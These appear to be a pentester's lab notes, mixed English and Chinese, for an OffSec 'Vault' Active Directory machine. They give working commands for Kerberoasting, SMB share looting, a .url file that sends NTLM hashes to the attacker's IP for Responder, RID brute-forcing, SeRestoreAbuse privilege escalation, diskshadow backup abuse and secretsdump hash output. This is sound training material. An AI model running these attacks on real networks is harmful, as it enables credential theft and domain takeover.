
```SQL
 GetUserSPNs.py -request -dc-ip $IP vault-offsec/svc_tgs
 rpcclient -U '' -N $IP
  smbclient //$IP/DocumentsShare -N -c 'prompt OFF; recurse ON; mget *'
```

```SQL
evil-winrm -i $IP  -u anirudh -p "SecureHM"
```

Custom share: Unlike the other shares listed (ADMIN$, C$, IPC$, NETLOGON, SYSVOL) which are standard Windows shares, "DocumentsShare" is a custom share. This suggests it was specifically created by the system administrators.

try if smb can put, and download

NTLM theft techniques are typically employed when you're looking to capture NTLM hashes from Windows systems. Here are some scenarios where using ntlm_theft could be particularly relevant in your pentest:

1. After discovering open shares: Now that you've identified the "DocumentsShare", this could be an ideal time to attempt NTLM theft. Users or systems accessing this share might be tricked into sending their NTLM hashes.

```SQL
[InternetShortcut]
URL=Random_nonsense
WorkingDirectory=Flibertygibbit
IconFile=\\<YOUR tun0 IP>\%USERNAME%.icon
IconIndex=1
```

sudo responder -I tun0 -wv

这是一个很好的问题。让我解释一下为什么当你把这个URL文件放入SMB共享文件夹时，它会自动运行：

1. Windows的自动图标加载机制：  
    当Windows资源管理器显示文件和文件夹时，它会尝试为每个项目加载相应的图标。这是为了提供更好的用户体验。
2. SMB共享的特殊性：  
    当用户或系统访问SMB共享时，Windows会尝试显示共享中的内容，包括文件图标。
3. .url文件的特殊处理：  
    .url文件被设计为包含图标信息。Windows会特别注意这种文件的IconFile属性。
4. 自动连接尝试：  
    当Windows看到IconFile指向一个网络路径时，它会自动尝试连接到该路径以获取图标。
5. 无需用户交互：  
    这个过程是自动的，不需要用户点击文件或执行任何操作。仅仅是查看包含该文件的文件夹就足以触发这个行为。
6. 后台进程：  
    可能有一些后台进程或服务定期扫描SMB共享，这也会触发图标加载过程。
7. 缓存机制：  
    Windows可能会尝试缓存共享文件夹的内容，包括图标，这又会触发连接尝试。
8. 权限问题：  
    在某些情况下，系统或高权限用户可能会自动访问新添加到共享的文件，导致触发图标加载。

这种自动行为正是使得这类攻击如此危险的原因。用户或系统管理员可能完全不知道正在发生凭证泄露，因为这一切都在后台自动进行，无需任何明显的用户交互。

这强调了几个重要的安全原则：

- 限制自动网络连接
- 仔细管理共享文件夹权限
- 警惕看似无害的文件类型
- 定期审查网络活动和日志

在渗透测试中，了解这种行为可以帮助展示潜在的安全漏洞，但在实际环境中，它也提醒我们需要更谨慎地处理共享资源和自动化过程。

Actually, `**crackmapexec**` is primarily used for protocols like SMB, WinRM, and LDAP, but it doesn’t support RDP directly. For RDP (Remote Desktop Protocol), you would typically use a different tool. Here are a couple of options:

1. **rdesktop**:
    - **Usage**: `**rdesktop $IP**`
    - **Description**: A popular open-source RDP client for Unix-based systems.
2. **xfreerdp**:
    - **Usage**: `**xfreerdp /u:username /p:password /v:$IP**`
    - **Description**: Another open-source RDP client that supports a wide range of features.
3. **mstsc** (on Windows):
    - **Usage**: `**mstsc /v:$IP**`
    - **Description**: The built-in Remote Desktop Connection client on Windows.

  

```SQL
crackmapexec smb $ip -u guest -p "" --rid-brute
```

┌──(kali㉿kali-linux-2022-2)-[~/offsec/vault]

└─$ crackmapexec smb 192.168.152.172 -u guest -p "" --rid-brute

SMB 192.168.152.172 445 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:vault.offsec) (signing:True) (SMBv1:False)

SMB 192.168.152.172 445 DC [+] vault.offsec\\guest:

SMB 192.168.152.172 445 DC [+] Brute forcing RIDs

SMB 192.168.152.172 445 DC 498: VAULT\\Enterprise Read-only Domain Controllers (SidTypeGroup)

SMB 192.168.152.172 445 DC 500: VAULT\\Administrator (SidTypeUser)

SMB 192.168.152.172 445 DC 501: VAULT\\Guest (SidTypeUser)

SMB 192.168.152.172 445 DC 502: VAULT\\krbtgt (SidTypeUser)

SMB 192.168.152.172 445 DC 512: VAULT\\Domain Admins (SidTypeGroup)

SMB 192.168.152.172 445 DC 513: VAULT\\Domain Users (SidTypeGroup)

SMB 192.168.152.172 445 DC 514: VAULT\\Domain Guests (SidTypeGroup)

SMB 192.168.152.172 445 DC 515: VAULT\\Domain Computers (SidTypeGroup)

SMB 192.168.152.172 445 DC 516: VAULT\\Domain Controllers (SidTypeGroup)

SMB 192.168.152.172 445 DC 517: VAULT\\Cert Publishers (SidTypeAlias)

SMB 192.168.152.172 445 DC 518: VAULT\\Schema Admins (SidTypeGroup)

SMB 192.168.152.172 445 DC 519: VAULT\\Enterprise Admins (SidTypeGroup)

SMB 192.168.152.172 445 DC 520: VAULT\\Group Policy Creator Owners (SidTypeGroup)

SMB 192.168.152.172 445 DC 521: VAULT\\Read-only Domain Controllers (SidTypeGroup)

SMB 192.168.152.172 445 DC 522: VAULT\\Cloneable Domain Controllers (SidTypeGroup)

SMB 192.168.152.172 445 DC 525: VAULT\\Protected Users (SidTypeGroup)

SMB 192.168.152.172 445 DC 526: VAULT\\Key Admins (SidTypeGroup)

SMB 192.168.152.172 445 DC 527: VAULT\\Enterprise Key Admins (SidTypeGroup)

SMB 192.168.152.172 445 DC 553: VAULT\\RAS and IAS Servers (SidTypeAlias)

SMB 192.168.152.172 445 DC 571: VAULT\\Allowed RODC Password Replication Group (SidTypeAlias)

SMB 192.168.152.172 445 DC 572: VAULT\\Denied RODC Password Replication Group (SidTypeAlias)

SMB 192.168.152.172 445 DC 1000: VAULT\\DC$ (SidTypeUser)

SMB 192.168.152.172 445 DC 1101: VAULT\\DnsAdmins (SidTypeAlias)

SMB 192.168.152.172 445 DC 1102: VAULT\\DnsUpdateProxy (SidTypeGroup)

SMB 192.168.152.172 445 DC 1103: VAULT\\anirudh (SidTypeUser)

from this, we find that only one user is **regu**lar **us**er **anir**udh, althought no **creden**tials, it still give the directipon

```Bash
crackmapexec smb 192.168.152.172 -u guest -p "" --rid-brute
```

cme smb can use —rid-brute as a guest user

  

- SMB (Server Message Block)
    - Example: `crackmapexec smb 192.168.1.0/24`
- WinRM (Windows Remote Management)
    - Example: `crackmapexec winrm 192.168.1.100 -u user -p password`
- MSSQL (Microsoft SQL Server)
    - Example: `crackmapexec mssql 192.168.1.100 -u sa -p password`
- LDAP (Lightweight Directory Access Protocol)
    - Example: `crackmapexec ldap 192.168.1.100 -u user -p password`
- SSH (Secure Shell)
    - Example: `crackmapexec ssh 192.168.1.100 -u user -p password`
- FTP (File Transfer Protocol)
    - Example: `crackmapexec ftp 192.168.1.100 -u user -p password`
- RDP (Remote Desktop Protocol)
    - Example: `crackmapexec rdp 192.168.1.100 -u user -p password`

  

Based on the information provided in the writeup, there are a few key indicators that suggest using Responder to capture NTLM hashes could be an effective approach for this VM:

1. Windows Active Directory environment: The initial Nmap scan revealed that this is a Windows machine in an Active Directory domain (vault.offsec). Active Directory environments often use NTLM authentication.
2. SMB access: The enumeration showed accessible SMB shares, particularly the "DocumentsShare". This indicates that SMB services are running and potentially vulnerable to NTLM relay attacks.
3. Limited initial access: After enumerating users (like anirudh), there was no direct way to authenticate. This suggests that capturing credentials could be the next logical step.
4. Mention in the writeup: The author explicitly states "We can enable responder and force ntlm authentication by placing mb share." This is a clear hint that this technique is applicable and likely necessary for progressing in this VM.

In penetration testing scenarios, when facing a Windows environment with SMB shares and limited initial access, attempting to capture NTLM hashes using Responder is often a standard and effective technique. It's particularly useful when other direct authentication methods have been exhausted.

Remember, in real-world penetration testing, the choice of techniques would be based on the specific environment, identified services, and potential vulnerabilities, always staying within the agreed scope and permissions of the engagement.

  

```PowerShell
.\SeRestoreAbuse.exe "cmd /c net localgroup administrators anirudh /add" WdiServiceHost
```

```PowerShell
reg query "HKLM\SYSTEM\CurrentControlSet\Services\seclogon" /v ImagePath
```

```PowerShell
reg add "HKLM\SYSTEM\CurrentControlSet\Services\seclogon" `
    /v ImagePath /t REG_EXPAND_SZ /d "%SystemRoot%\System32\svchost.exe -k netsvcs -p" /f
```

```PowerShell
Start-Service seclogon
```

```PowerShell
 on Windows, privileges are only assigned to your logon session token at the moment you log in — and that token is what all your processes inherit.
```

┌──(kali㉿hk-DC01)-[/mnt/…/Downloads/tools/winpriv/sebackuppriv]  
└─$ impacket-secretsdump -sam sam -system system LOCAL  
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[_] Target system bootKey: 0xe9a15188a6ad2d20d26fe2bc984b369e_  
_[_] Dumping local SAM hashes (uid:rid:lmhash:nthash)  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:608339ddc8f434ac21945e026887dc36:::  
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
[*] Cleaning up...

  

```PowerShell
@"
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
"@ -replace "`n", "`r`n" | Out-File -Encoding ASCII -FilePath "raj.dsh"
```

```PowerShell
wmiexec.py – Executes commands via WMI.
smbexec.py – Similar to psexec but uses SMB.
atexec.py – Executes commands via the Windows Task Scheduler.
secretsdump.py – Dumps hashes from SAM/LSASS.
```